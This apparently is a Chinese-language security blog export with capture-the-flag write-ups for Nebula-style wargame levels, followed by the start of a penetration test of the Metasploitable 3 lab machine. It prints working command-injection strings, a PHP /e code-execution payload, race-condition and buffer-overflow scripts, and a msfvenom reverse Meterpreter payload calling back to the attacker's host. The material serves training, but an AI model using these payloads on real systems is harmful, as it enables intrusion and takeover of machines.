title="Level07"></a>Level07</h1><ol><li>index.cgiç›‘å¬ç«¯å£8888, CGIé‡‡ç”¨getæ–¹æ³•å“åº”è¯·æ±‚, è¯¥ç¨‹åºä¼ è¾“ Hostå‚æ•°</li><li>æ„é€ è¯­å¥é—­åˆpingå‘½ä»¤( ||/bin/getflag07)</li></ol><p><img src="https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png" alt="07"></p><h1 id="Level08"><a href="#Level08" class="headerlink" title="Level08"></a>Level08</h1><ol><li>ä½¿ç”¨ncå°†capture.pcapä¼ åˆ°kali:<ul><li>é¶æœº nc -lp 4455 &lt; capture.pcap -q 1</li><li>æ”»å‡»æœº nc -nv 192.168.1.233 4455 &gt; cap.pcap</li></ul></li><li>ä½¿ç”¨Wiresharkè¿›è¡Œåˆ†æ, è¿½è¸ªTCPæµ, å¾—åˆ°Password: backd00Rmate</li><li>ç™»å½•flag08, æ‰§è¡Œ/bin/getflag08å¾—åˆ°flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png" alt="08"></p><h1 id="Level09"><a href="#Level09" class="headerlink" title="Level09"></a>Level09</h1><ol><li><p>æ³¨æ„åˆ°ä»£ç </p><p><code>$contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</code></p><p>preg_replaceç¬¬ä¸€å‚æ•°ä½¿ç”¨äº†<strong>/eæ¨¡å¼</strong>ï¼Œpreg_replaceçš„ç¬¬äºŒä¸ªå‚æ•°ä¼šä½œä¸ºä»£ç æ‰§è¡Œã€‚</p></li><li><p>ç”¨phpä¸­çš„systemå‡½æ•°æ‰§è¡Œå¤–éƒ¨çš„shellå‘½ä»¤ï¼Œå°†<code>[email &quot;&#123;$&#123;system(getflag)&#125;&#125;&quot;]</code>å†™å…¥/tmp/atk</p></li><li><p>./flag19 /tmp/atk è·å¾—flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png" alt="09"></p><h1 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h1><ol><li><p>flag10ç¨‹åºåˆ¤æ–­ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰è¯»è¯¥æ–‡ä»¶çš„æƒé™, å¦‚æœæœ‰, é€šè¿‡18888ç«¯å£å‘é€ç»™æŒ‡å®šhost</p></li><li><p>kaliæœºæ°¸ä¹…ç›‘å¬18888ç«¯å£, å¹¶å°†å†…å®¹è¾“å‡ºåˆ°log: ncat -lp 18888 -k &gt;&gt; log</p></li><li><p>ç¼–å†™æ¡ä»¶ç«äº‰è„šæœ¬switch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -s /home/level10/null /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line"> ln -s /home/flag10/token /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>ç¼–å†™è¿è¡Œè„šæœ¬start.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">/home/flag10/flag10 /home/level10/fake 192.168.1.114</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>ä»¥1ä¼˜å…ˆçº§åå°è¿è¡Œswitch.sh, ä»¥19ä¼˜å…ˆçº§è¿è¡Œstart.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nice -n1 sh switch.sh &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nice -n19 sh start.sh</span></span><br></pre></td></tr></table></figure></li><li><p>åœ¨kaliæœºæŸ¥çœ‹log, å¾—åˆ°token( b3c5-6d82-7sfc), ç™»å½•flag10, è·å¾—flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png" alt="10"></p><h1 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h1><ol><li>è¿æ¥50000ç«¯å£çš„luaæœåŠ¡ï¼š nc -nv 127.0.0.1 50000</li><li>è¾“å…¥æŒ‡ä»¤é—­åˆè¯­å¥ï¼Œè·å¾—flagï¼š ; /bin/getflag12 &gt; ~/flag; #</li></ol><p><img src="https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png" alt="12"></p><h1 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h1><ol><li>ä½¿ç”¨gdbè°ƒè¯•ç¨‹åºï¼š gdb ./flag13</li><li>åœ¨mainä¸­æ‰“æ–­ç‚¹ï¼š (gdb) b main</li><li>(gdb) display /20i $pcï¼ŒæŸ¥çœ‹20è¡Œæ±‡ç¼–</li><li>è¿è¡Œï¼Œç„¶åå•æ­¥è°ƒè¯•åˆ° â€=&gt; 0x080484f4 &lt;+48&gt;:    cmp eax, 0x3e8â€œ</li><li>ä¿®æ”¹å¯„å­˜å™¨eaxçš„å€¼ä¸º0x3e8ï¼š (gdb) set $eax=0x3e8</li><li>ç»§ç»­æ‰§è¡Œå¾—åˆ°tokenï¼ˆb705702b-76a8-42b0-8844-3adabbe5ac58ï¼‰ï¼Œç™»å½•flag13è·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png" alt="13"></p><h1 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h1><ol><li>è¿è¡Œflag14ï¼Œè§‚å¯Ÿå‘ç°åŠ å¯†ç®—æ³•æ˜¯ str[i] += i;</li><li>å°†åŠ å¯†çš„tokenè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ° 318d229.998d.5f</li><li>ç™»å½•flag14ï¼Œè·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png" alt="14"></p><h1 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h1><ol><li><p>ç¼–å†™è„šæœ¬ /tmp/getflagï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/bin/getflag16 &gt; /tmp/flag</span><br></pre></td></tr></table></figure></li><li><p>å†™ä¸€ä¸ªhtmlè¡¨å•ï¼Œåœ¨usernameä¸­æäº¤ â€œ;a=/tmp/getflag;${a,,};</p></li><li><p>æŸ¥çœ‹ /tmp/flag è·å¾— flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png" alt="16"></p><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><ol><li><p>ç¼–å†™è„šæœ¬ï¼Œforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åçˆ¶è¿›ç¨‹é€€å‡ºï¼Œå­è¿›ç¨‹æ‰§è¡Œ /home/flag19/flag19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;Â </span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/getflag19&gt;/tmp/flag_19&quot;</span>, <span class="literal">NULL</span>&#125;;  </span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">        Â execve(<span class="string">&quot;/home/flag19/flag19&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;ç¼–è¯‘é“¾æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹è¾“å‡ºè·å¾—flag</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘é“¾æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹è¾“å‡ºè·å¾—flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png" alt="19"></p><h1 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h1><ol><li><p>è¾“å…¥65ä¸ªâ€™aâ€™ç»™flag20ç¨‹åºï¼Œé€ æˆæ•°ç»„è¶Šç•Œï¼Œä¿®æ”¹modifiedçš„å€¼ä¸ä¸º0ï¼Œè·å¾—flagï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..64&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&#x27;a&#x27;</span> &gt;&gt; /tmp/overflow20;<span class="keyword">done</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/overflow20 | ./flag20</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png" alt="20"></p><h1 id="Level21"><a href="#Level21" class="headerlink" title="Level21"></a>Level21</h1><ol><li><p>è¶Šç•Œåä¿®æ”¹modifiedä¸º0x56575859 (ä¹Ÿå°±æ˜¯ VWXY)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png" alt="21"></p><h1 id="Level22"><a href="#Level22" class="headerlink" title="Level22"></a>Level22</h1><ol><li><p>ç¼–å†™æ·»åŠ ç¯å¢ƒå˜é‡çš„è„šæœ¬ /tmp/atk22.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;export NJUCS=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&#x27;&quot;</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘è¿è¡Œï¼Œå°†è¾“å‡ºç»“æœæ·»åŠ åˆ° ~/.bashrc ä¸­ï¼Œåˆ·æ–°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 &gt;&gt; ~/.bashrc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ ./flag22 ï¼Œè·å¾—flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png" alt="22"></p><h1 id="Level23"><a href="#Level23" class="headerlink" title="Level23"></a>Level23</h1><ol><li><p>(gdb) x win æŸ¥çœ‹winå‡½æ•°åœ°å€ï¼Œä¸º 0x804846b</p></li><li><p>ç¼–å†™/tmp/atk23.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Â <span class="built_in">printf</span>(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&quot;</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ„é€ payloadï¼Œè¿è¡Œ</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡å®Œæ•´çš„æ¸—é€æµ‹è¯•</title>
      <link href="/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>é¶æœºï¼šmetasploitable 3ï¼Œæœ‰è®¸å¤šæ¼æ´ä¾›ç»ƒä¹ ï¼Œå¹¶è—æœ‰15ä¸ªéšè—å½©è›‹ï¼Œè€å¸ˆå‘çš„é•œåƒåˆ å»äº†éƒ¨åˆ†æœ‰æŸåçš„flag</p><h1 id="ä¸€ã€ä¿¡æ¯æœé›†é˜¶æ®µ"><a href="#ä¸€ã€ä¿¡æ¯æœé›†é˜¶æ®µ" class="headerlink" title="ä¸€ã€ä¿¡æ¯æœé›†é˜¶æ®µ"></a>ä¸€ã€ä¿¡æ¯æœé›†é˜¶æ®µ</h1><ol><li><p>é€šè¿‡nmapæ‰«æå‘ç°windowé¶æœºçš„ipåœ°å€<code>10.0.2.4</code>ï¼ŒPSï¼škaliæ”»å‡»æœºipï¼š10.0.2.15</p></li><li><p>å¯åŠ¨msfconfigï¼Œä½¿ç”¨nmapæ‰«æå…¨ç«¯å£ï¼Œå‘ç°é¶æœºå¼€å¯äº†å¦‚ä¸‹ç«¯å£ï¼ŒåŠå…¶æœåŠ¡ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a win08-r2</span><br><span class="line">[*] Added workspace: win08-r2</span><br><span class="line">[*] Workspace: win08-r2</span><br><span class="line">msf &gt; db_nmap -sS -sV -sC -p- -n -v 10.0.2.4</span><br><span class="line">msf &gt; services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line">host      port   proto  name        state  info</span><br><span class="line">----      ----   -----  ----        -----  ----</span><br><span class="line">10.0.2.4  21     tcp    ftp         open   Microsoft ftpd</span><br><span class="line">10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0</span><br><span class="line">10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5</span><br><span class="line">10.0.2.4  1617   tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (</span><br><span class="line">                                           2016-04-26)</span><br><span class="line">10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Ser</span><br><span class="line">                                           ver</span><br><span class="line">10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP</span><br><span class="line">                                           /UPnP</span><br><span class="line">10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Editio</span><br><span class="line">                                           n  4.0</span><br><span class="line">10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8</span><br><span class="line">10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/</span><br><span class="line">                                           5.3.10 DAV/2</span><br><span class="line">10.0.2.4  9200   tcp    wap-wsp     open</span><br><span class="line">10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49179  tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  49180  tcp    tcpwrapped  open</span><br></pre></td></tr></table></figure></li></ol><h1 id="äºŒã€æ¼æ´åˆ†æä¸åˆ©ç”¨é˜¶æ®µ"><a href="#äºŒã€æ¼æ´åˆ†æä¸åˆ©ç”¨é˜¶æ®µ" class="headerlink" title="äºŒã€æ¼æ´åˆ†æä¸åˆ©ç”¨é˜¶æ®µ"></a>äºŒã€æ¼æ´åˆ†æä¸åˆ©ç”¨é˜¶æ®µ</h1><h2 id="ï¼ˆ1ï¼‰WebDAVæœåŠ¡æ¼æ´"><a href="#ï¼ˆ1ï¼‰WebDAVæœåŠ¡æ¼æ´" class="headerlink" title="ï¼ˆ1ï¼‰WebDAVæœåŠ¡æ¼æ´"></a>ï¼ˆ1ï¼‰WebDAVæœåŠ¡æ¼æ´</h2><p>é€šè¿‡kaliæä¾›çš„WebDAVæœåŠ¡æ¼æ´åˆ©ç”¨å·¥å…·DAVTestã€‚è¯¥å·¥å…·ä¼šè‡ªåŠ¨æ£€æµ‹æƒé™ï¼Œå¯»æ‰¾å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ã€‚ä¸€æ—¦å‘ç°ï¼Œç”¨æˆ·å°±å¯ä»¥ä¸Šä¼ å†…ç½®çš„åé—¨å·¥å…·ï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œæ§åˆ¶ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·å¯ä»¥ä¸Šä¼ ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¾¿äºåæœŸåˆ©ç”¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# davtest -url http://10.0.2.4:8585/uploads/                                                              </span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line">NOTE    Random string for this session: TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi</span><br><span class="line">PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml</span><br><span class="line">PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml</span><br><span class="line">PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx</span><br><span class="line">PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp</span><br><span class="line">PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl</span><br><span class="line">PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp</span><br><span class="line">PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm</span><br><span class="line">********************************************************</span><br><span class="line"> Checking for test file execution</span><br><span class="line">EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">EXEC    cgi     FAIL</span><br><span class="line">EXEC    shtml   FAIL</span><br><span class="line">EXEC    jhtml   FAIL</span><br><span class="line">EXEC    aspx    FAIL</span><br><span class="line">EXEC    jsp     FAIL</span><br><span class="line">EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">EXEC    pl      FAIL</span><br><span class="line">EXEC    asp     FAIL</span><br><span class="line">EXEC    cfm     FAIL</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å‘ç°å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶</p><p>ç”Ÿæˆæ”»å‡»è½½è·å¹¶ä¸Šä¼ ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw &gt;demon.php</span><br><span class="line"></span><br><span class="line">(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.15</span><br><span class="line">LHOST =&gt; 10.0.2.15</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.15:8888 </span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:8888 -&gt; 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500</span><br></pre></td></tr></table></figure><p>å¾—åˆ°Meterpreterï¼ŒæˆåŠŸï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to 